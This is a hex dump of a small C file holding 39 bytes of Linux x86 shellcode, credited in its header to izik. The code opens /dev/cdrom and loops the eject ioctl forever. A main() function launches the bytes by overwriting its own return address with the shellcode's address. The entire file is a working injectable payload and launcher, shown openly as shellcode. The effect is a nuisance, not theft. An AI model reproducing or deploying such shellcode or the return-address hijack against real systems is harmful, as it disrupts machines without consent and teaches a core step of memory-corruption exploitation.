00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 32 34 2f 37 20  6f 70 65 6e 20 63 64 2d  |6) 24/7 open cd-|
00000020  72 6f 6d 20 6c 6f 6f 70  20 28 66 6f 6c 6c 6f 77  |rom loop (follow|
00000030  73 20 22 2f 64 65 76 2f  63 64 72 6f 6d 22 20 73  |s "/dev/cdrom" s|
00000040  79 6d 6c 69 6e 6b 29 20  2d 20 33 39 20 62 79 74  |ymlink) - 39 byt|
00000050  65 73 0d 0a 20 2a 20 2d  20 69 7a 69 6b 20 3c 69  |es.. * - izik <i|
00000060  7a 69 6b 40 74 74 79 36  34 2e 6f 72 67 3e 0d 0a  |zik@tty64.org>..|
00000070  20 2a 2f 0d 0a 0d 0a 63  68 61 72 20 73 68 65 6c  | */....char shel|
00000080  6c 63 6f 64 65 5b 5d 20  3d 20 0d 0a 0d 0a 09 22  |lcode[] = ....."|
00000090  5c 78 36 61 5c 78 30 35  22 20 20 20 20 20 20 20  |\x6a\x05"       |
000000a0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 24  |       // push $|
000000b0  30 78 35 20 0d 0a 09 22  5c 78 35 38 22 20 20 20  |0x5 ..."\x58"   |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000000d0  2f 20 70 6f 70 20 25 65  61 78 20 0d 0a 09 22 5c  |/ pop %eax ..."\|
000000e0  78 33 31 5c 78 63 39 22  20 20 20 20 20 20 20 20  |x31\xc9"        |
000000f0  20 20 20 20 20 20 2f 2f  20 78 6f 72 20 25 65 63  |      // xor %ec|
00000100  78 2c 25 65 63 78 20 0d  0a 09 22 5c 78 35 31 22  |x,%ecx ..."\x51"|
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  20 20 2f 2f 20 70 75 73  68 20 25 65 63 78 20 0d  |  // push %ecx .|
00000130  0a 09 22 5c 78 62 35 5c  78 30 38 22 20 20 20 20  |.."\xb5\x08"    |
00000140  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000150  20 24 30 78 38 2c 25 63  68 20 0d 0a 09 22 5c 78  | $0x8,%ch ..."\x|
00000160  36 38 5c 78 36 34 5c 78  37 32 5c 78 36 66 5c 78  |68\x64\x72\x6f\x|
00000170  36 64 22 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |6d"  // push $0x|
00000180  36 64 36 66 37 32 36 34  20 0d 0a 09 22 5c 78 36  |6d6f7264 ..."\x6|
00000190  38 5c 78 36 35 5c 78 37  36 5c 78 32 66 5c 78 36  |8\x65\x76\x2f\x6|
000001a0  33 22 20 20 2f 2f 20 70  75 73 68 20 24 30 78 36  |3"  // push $0x6|
000001b0  33 32 66 37 36 36 35 20  0d 0a 09 22 5c 78 36 38  |32f7665 ..."\x68|
000001c0  5c 78 32 66 5c 78 32 66  5c 78 32 66 5c 78 36 34  |\x2f\x2f\x2f\x64|
000001d0  22 20 20 2f 2f 20 70 75  73 68 20 24 30 78 36 34  |"  // push $0x64|
000001e0  32 66 32 66 32 66 20 0d  0a 09 22 5c 78 38 39 5c  |2f2f2f ..."\x89\|
000001f0  78 65 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe3"            |
00000200  20 20 2f 2f 20 6d 6f 76  20 25 65 73 70 2c 25 65  |  // mov %esp,%e|
00000210  62 78 20 0d 0a 09 22 5c  78 63 64 5c 78 38 30 22  |bx ..."\xcd\x80"|
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000230  20 69 6e 74 20 24 30 78  38 30 20 0d 0a 09 22 5c  | int $0x80 ..."\|
00000240  78 38 39 5c 78 63 33 22  20 20 20 20 20 20 20 20  |x89\xc3"        |
00000250  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 25 65 61  |      // mov %ea|
00000260  78 2c 25 65 62 78 20 0d  0a 09 22 5c 78 36 36 5c  |x,%ebx ..."\x66\|
00000270  78 62 39 5c 78 30 39 5c  78 35 33 22 20 20 20 20  |xb9\x09\x53"    |
00000280  20 20 2f 2f 20 6d 6f 76  20 24 30 78 35 33 30 39  |  // mov $0x5309|
00000290  2c 25 63 78 20 0d 0a 09  0d 0a 09 2f 2f 0d 0a 09  |,%cx ......//...|
000002a0  2f 2f 20 3c 5f 6f 70 65  6e 69 74 3e 3a 0d 0a 09  |// <_openit>:...|
000002b0  2f 2f 0d 0a 0d 0a 09 22  5c 78 62 30 5c 78 33 36  |//....."\xb0\x36|
000002c0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
000002d0  2f 20 6d 6f 76 20 24 30  78 33 36 2c 25 61 6c 20  |/ mov $0x36,%al |
000002e0  0d 0a 09 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |..."\xcd\x80"   |
000002f0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000300  74 20 24 30 78 38 30 20  0d 0a 09 22 5c 78 65 62  |t $0x80 ..."\xeb|
00000310  5c 78 66 61 22 3b 20 20  20 20 20 20 20 20 20 20  |\xfa";          |
00000320  20 20 20 2f 2f 20 6a 6d  70 20 3c 5f 6f 70 65 6e  |   // jmp <_open|
00000330  69 74 3e 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |it>....int main(|
00000340  69 6e 74 20 61 72 67 63  2c 20 63 68 61 72 20 2a  |int argc, char *|
00000350  2a 61 72 67 76 29 20 7b  0d 0a 09 69 6e 74 20 2a  |*argv) {...int *|
00000360  72 65 74 3b 0d 0a 09 72  65 74 20 3d 20 28 69 6e  |ret;...ret = (in|
00000370  74 20 2a 29 26 72 65 74  20 2b 20 32 3b 0d 0a 09  |t *)&ret + 2;...|
00000380  28 2a 72 65 74 29 20 3d  20 28 69 6e 74 29 20 73  |(*ret) = (int) s|
00000390  68 65 6c 6c 63 6f 64 65  3b 0d 0a 7d              |hellcode;..}|
0000039c
